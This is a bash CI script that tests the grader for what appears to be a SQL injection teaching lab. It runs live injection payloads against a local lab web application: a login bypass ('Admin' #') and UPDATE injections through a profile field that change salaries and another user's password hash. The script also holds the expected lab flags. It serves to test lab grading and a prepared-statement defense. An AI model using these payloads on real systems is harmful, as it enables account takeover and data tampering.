#!/usr/bin/env bash
# Exercise all four student checks against the live application.
set -euo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

CHECKER="${CHECKER:?CHECKER must point to the generated sqllab binary}"
DEFENSE_DIR="${DEFENSE_DIR:?DEFENSE_DIR must point to the temporary defense copy}"
COOKIE_JAR="${CI_WORK_DIR:?CI_WORK_DIR must be set}/alice.cookies"

expect_flag() {
  local expected="$1"
  shift
  local output
  output="$("$@")"
  grep -Fq "$expected" <<<"$output" || {
    echo "$output" >&2
    ci_fail "checker did not return expected flag $expected"
  }
}

check_one() {
  printf '10000\n20000\n10211002\n' | "$CHECKER" check 1
}
expect_flag 'CiSqlFlagOne123' check_one
ci_ok "check 1 validates Alice's EID, salary and SSN"

check_two() {
  printf 'Admin%%27%%20%%23\n' | "$CHECKER" check 2
}
expect_flag 'CiSqlFlagTwo456' check_two
ci_ok "check 2 submits the student's URL-encoded payload and observes the admin roster"

curl --fail --silent --show-error \
  --cookie-jar "$COOKIE_JAR" --cookie "$COOKIE_JAR" \
  --header 'Host: www.seed-server.com' \
  'http://127.0.0.1/unsafe_home.php?username=Alice&Password=seedalice' >/dev/null

submit_profile_payload() {
  local payload="$1"
  curl --fail --silent --show-error --location --get \
    --cookie-jar "$COOKIE_JAR" --cookie "$COOKIE_JAR" \
    --header 'Host: www.seed-server.com' \
    --data-urlencode "NickName=$payload" \
    --data-urlencode 'Email=' \
    --data-urlencode 'Address=' \
    --data-urlencode 'Password=' \
    --data-urlencode 'PhoneNumber=' \
    'http://127.0.0.1/unsafe_edit_backend.php' >/dev/null
}

submit_profile_payload "Alice', Salary=60000 WHERE Name='Alice' #"
submit_profile_payload "Alice', Salary=1 WHERE Name='Boby' #"

if printf 'seedboby\n' | "$CHECKER" check 3 >/dev/null 2>&1; then
  ci_fail "check 3 accepted Boby's unchanged initial password"
fi
ci_ok "check 3 rejects the unchanged baseline password"

BOBY_PASSWORD='Ci-Boby-Password-2026!'
BOBY_HASH="$(printf '%s' "$BOBY_PASSWORD" | sha1sum | awk '{print $1}')"
submit_profile_payload "Alice', Password='$BOBY_HASH' WHERE Name='Boby' #"

check_three() {
  printf '%s\n' "$BOBY_PASSWORD" | "$CHECKER" check 3
}
expect_flag 'CiSqlFlagTre789' check_three
ci_ok "check 3 observes both salary changes and authenticates with Boby's new password"

cp -- "$REPO_ROOT/ci/defense-safe.php" "$DEFENSE_DIR/unsafe.php"
php -l "$DEFENSE_DIR/unsafe.php" >/dev/null

check_four() {
  "$CHECKER" check 4
}
expect_flag 'CiSqlFlagFor012' check_four
ci_ok "check 4 accepts a safe prepared statement and rejects the former admin injection"
